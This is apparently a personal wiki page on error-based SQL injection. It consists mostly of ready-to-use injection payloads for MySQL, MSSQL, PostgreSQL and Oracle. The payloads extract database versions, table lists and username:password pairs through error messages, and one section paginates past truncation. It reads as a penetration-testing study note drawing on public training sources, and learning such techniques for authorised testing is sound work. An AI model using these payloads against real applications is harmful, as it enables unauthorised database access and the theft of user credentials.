# Error-Based SQL Injection

← [[SQLi-Overview]]

---

Error-based SQLi extracts data by deliberately triggering database errors that include the data you want in the error message. It's fast and readable — no need for slow character-by-character extraction.

---

## How It Works

Some database functions error out and include their arguments in the error message. If you pass a subquery as the argument, the query result appears in the error.

---

## MySQL — extractvalue / updatexml

### extractvalue()

```sql
' AND extractvalue(1, concat(0x7e, (SELECT version()))) --

-- Error: XPATH syntax error: '~8.0.28'
-- 0x7e = ~ (tilde, used as a delimiter)
```

```sql
-- Current database
' AND extractvalue(1, concat(0x7e, (SELECT database()))) --

-- List tables
' AND extractvalue(1, concat(0x7e, (SELECT group_concat(table_name) 
  FROM information_schema.tables WHERE table_schema=database()))) --

-- Dump passwords (returns first 32 chars due to error msg length limit)
' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1))) --
```

### updatexml()

```sql
' AND updatexml(1, concat(0x7e, (SELECT version())), 1) --
' AND updatexml(1, concat(0x7e, (SELECT database())), 1) --
```

### Getting More Than 32 Characters

Error messages are truncated. Use `substring()` to paginate:

```sql
-- Characters 1-32
' AND extractvalue(1, concat(0x7e, substring((SELECT password FROM users LIMIT 1),1,32))) --

-- Characters 33-64
' AND extractvalue(1, concat(0x7e, substring((SELECT password FROM users LIMIT 1),33,32))) --
```

---

## MSSQL — convert() / cast()

```sql
-- Force a type conversion error containing query output
' AND 1=convert(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --
' AND 1=cast((SELECT TOP 1 password FROM users) AS int) --

-- Error: Conversion failed when converting the nvarchar value 'admin_hash' to data type int
```

---

## PostgreSQL — cast()

```sql
-- Same concept with PostgreSQL
' AND 1=cast((SELECT version()) AS int) --

-- Error: invalid input syntax for type integer: "PostgreSQL 14.1"
```

---

## Oracle — utl_inaddr (older) / ctxsys.drithsx.sn()

```sql
' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --

-- Error: ORA-20000: Oracle Text error: DRG-11701: thesaurus Oracle Database...
```

---

## Extracting Multiple Rows

Use `group_concat()` (MySQL) to get all results at once:

```sql
-- All tables in one hit
' AND extractvalue(1, concat(0x7e, (
  SELECT group_concat(table_name SEPARATOR ', ')
  FROM information_schema.tables 
  WHERE table_schema=database()
))) --

-- All usernames
' AND extractvalue(1, concat(0x7e, (
  SELECT group_concat(username, ':', password SEPARATOR ' | ')
  FROM users
))) --
```

---

## When Error-Based Doesn't Work

- Errors are suppressed (app shows generic "something went wrong")
- Database doesn't support these specific functions
- WAF blocks the payload

→ Fall back to [[Blind-SQLi]]

---

*Back to [[SQLi-Overview]] | Related: [[Blind-SQLi]] | Quick payloads: [[SQLi-Payloads]]*

*Sources: PortSwigger Web Security Academy, PayloadsAllTheThings*
